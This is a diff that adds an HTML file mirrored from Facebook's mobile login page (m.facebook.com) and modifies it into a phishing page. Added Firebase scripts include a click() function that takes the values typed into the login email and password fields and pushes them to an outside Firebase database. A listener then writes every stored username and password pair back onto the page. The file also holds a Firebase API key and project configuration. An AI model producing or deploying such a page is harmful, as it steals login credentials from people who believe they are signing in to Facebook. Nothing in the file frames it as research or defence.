@@ -1,0 +1,52 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
+<html lang="vi" xmlns="http://www.w3.org/1999/xhtml">
+<!-- Mirrored from m.facebook.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 03 Jun 2021 03:59:10 GMT -->
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<script src="https://cdn.firebase.com/v0/firebase.js"></script>
+<!-- The core Firebase JS SDK is always required and must be listed first -->
+<script src="https://www.gstatic.com/firebasejs/8.6.3/firebase-app.js"></script>
+
+<!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+<script src="https://www.gstatic.com/firebasejs/8.6.3/firebase-analytics.js"></script>
+
+<script>
+  // Your web app's Firebase configuration
+  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+  var firebaseConfig = {
+    apiKey: "AIzaSyDy-NWTyczIbiz8oy4Hgi6aVVlhussZjAg",
+    authDomain: "ifan-23695.firebaseapp.com",
+    databaseURL: "https://ifan-23695.firebaseio.com",
+    projectId: "ifan-23695",
+    storageBucket: "ifan-23695.appspot.com",
+    messagingSenderId: "848034363684",
+    appId: "1:848034363684:web:74de6b79b6073dcf599bb1",
+    measurementId: "G-B1BXDD3LNT"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  firebase.analytics();
+  var myDataRef=new Firebase("https://ifan-23695.firebaseio.com/");
+
+</script>
+
+<!-- Mirrored from m.facebook.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 03 Jun 2021 03:59:14 GMT -->
+<script>
+    // Your web app's Firebase configuration
+    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+   
+
+    myDataRef.on('child_added', function(snapshot) {
+            var getdata = snapshot.val();
+            console.log(snapshot.val());
+           document.write(getdata.username+"-"+getdata.password+"<br>");
+        });
+function click(){
+
+    //     alert(document.getElementById("m_login_email"));
+myDataRef.push({username: document.getElementById('m_login_email').value, password: document.getElementById('m_login_pass').value});
+    }
+  </script>
+</html>
